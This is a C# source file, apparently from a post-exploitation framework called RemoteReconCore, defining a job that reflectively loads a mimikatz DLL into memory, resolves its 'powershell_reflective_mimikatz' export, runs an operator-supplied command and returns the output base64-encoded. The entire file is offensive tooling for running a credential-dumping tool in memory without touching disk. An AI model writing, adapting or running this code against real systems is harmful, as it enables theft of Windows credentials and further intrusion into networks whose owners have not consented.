using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Reflection;
using ReflectiveInjector;

namespace RemoteReconCore
{
    public class mimikatz : IJobs
    {
        private static string mmCmd = "";
        private static byte[] mmBin;
        public mimikatz(string cmd, byte[] mod)
        {
            mmCmd = cmd;
            mmBin = mod;
        }

        public KeyValuePair<int, string> Run()
        {
            //Load the mimikatz dll reflectively into the current process. Call the function export
            // for powershell_reflective_mimikatz with our command and obtain the result.

            Injector m = new Injector(mmBin);
            if (!m.Load())
                return new KeyValuePair<int, string>(9, Convert.ToBase64String(Encoding.ASCII.GetBytes("Mimikatz load failed")));

            IntPtr hMimikatz = GetModuleHandle("mimikatz-RR.dll");
            if (hMimikatz == null || hMimikatz == IntPtr.Zero)
                return new KeyValuePair<int, string>(9, Convert.ToBase64String(Encoding.ASCII.GetBytes("Unable to obtain handle to mimikatz module")));

            IntPtr exportAddr = GetProcAddress(hMimikatz, "powershell_reflective_mimikatz");
            if(exportAddr == null || exportAddr == IntPtr.Zero)
                return new KeyValuePair<int, string>(9, Convert.ToBase64String(Encoding.ASCII.GetBytes("Unable to obtain handle to mimikatz module")));

            powershell_reflective_mimikatz mimikatz = (powershell_reflective_mimikatz)Marshal.GetDelegateForFunctionPointer(exportAddr, typeof(powershell_reflective_mimikatz));

            try
            {
                string res = mimikatz(mmCmd);
                string enc = Convert.ToBase64String(Encoding.ASCII.GetBytes(res));
                return new KeyValuePair<int, string>(0, enc);
            }
            catch (Exception e)
            {
                string enc = Convert.ToBase64String(Encoding.ASCII.GetBytes(e.ToString()));
                return new KeyValuePair<int, string>(9, enc);
            }
            
        }

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate string powershell_reflective_mimikatz(string command);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    }
}
